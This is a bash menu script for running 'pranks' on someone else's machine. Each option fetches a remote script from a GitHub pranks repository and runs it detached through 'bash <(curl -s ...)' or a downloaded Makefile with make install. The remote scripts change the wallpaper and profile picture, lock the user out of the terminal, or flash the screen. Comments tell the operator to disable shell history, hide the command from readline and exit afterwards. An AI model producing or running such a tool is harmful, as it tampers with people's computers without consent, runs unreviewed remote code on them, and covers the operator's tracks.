#!/bin/bash

# Menu for selecting which scripts to run

# Note: to execute this script, run "set +o history" to prevent menu.sh from being saved to history
# Then launch menu.sh with a space appended to it to prevent it from being saved to readline

# See which terminals exist on the user's machine
if command -v "gnome-terminal" >/dev/null; then
	SRC_LAUNCH="gnome-terminal -x"
elif command -v "konsole" >/dev/null; then
	SRC_LAUNCH="konsole -e"
else
	SRC_LAUNCH=""
fi;

# Functions
wallpaper() {
	bash <(curl -s "$WALLPAPER") & disown
}

profile() {
	bash <(curl -s "$PROFILE") & disown
}

parrot() {
	bash <(curl -s "$PARROT") & disown
}

# Lockout gets opened in a new window instead of replacing the current terminal like before
lockout() {
	if [ "$SRC_LAUNCH" ] ; then
		$SRC_LAUNCH bash --rcfile <(curl -s "$LOCKOUT") -i & disown
	else
		printf "wat da hell is this distro bro\n" # if mainstream terminals don't exist
	fi
}

flashbang() {
	bash <(curl -s "$FLASHBANG") & disown
}

matrix() {
	curl -s -L $MATRIX -o Makefile && make && make install && rm Makefile
}

# URLs
WALLPAPER="https://raw.githubusercontent.com/heixier/pranks/refs/heads/main/wallpaper/change_bg.sh"
PROFILE="https://raw.githubusercontent.com/Heixier/pranks/refs/heads/main/face/change_pic.sh"
PARROT="https://raw.githubusercontent.com/Heixier/pranks/refs/heads/main/parrot/parrot.sh"
LOCKOUT="https://raw.githubusercontent.com/Heixier/pranks/refs/heads/main/lockout/lockout.sh"
FLASHBANG="https://raw.githubusercontent.com/Heixier/pranks/refs/heads/main/flashbang/flashbang.sh"
MATRIX="https://raw.githubusercontent.com/Heixier/pranks/refs/heads/main/matrix/Makefile" 

# Get all the options and stuff then runs them detached because parallel processing wooho
for opt in "$@"
do
	case "$opt" in
		"bg" | "wallpaper")
			wallpaper
			;;

		"profile" | "icon" | face)
			profile
			;;

		"parrot")
			parrot
			;;

		"lockout") 
			lockout
			;;

		"flash" | "flashbang")
			flashbang
			;;

		"matrix" | "neo")
			matrix
			;;

		"usb") # what do you think this is
			parrot
			wallpaper
			;;
		*)
			;;
	esac
done

# Remember to append "&& exit"
# e.g bash menu.sh && exit
